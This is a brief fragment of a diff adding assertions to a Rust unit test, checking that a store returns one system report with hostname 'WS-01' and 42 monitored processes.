+        let reports = store.get_system_reports(10);
+        assert_eq!(reports.len(), 1);
+        assert_eq!(reports[0].hostname, "WS-01");
+        assert_eq!(reports[0].monitored_processes_count, 42);
     }
 }
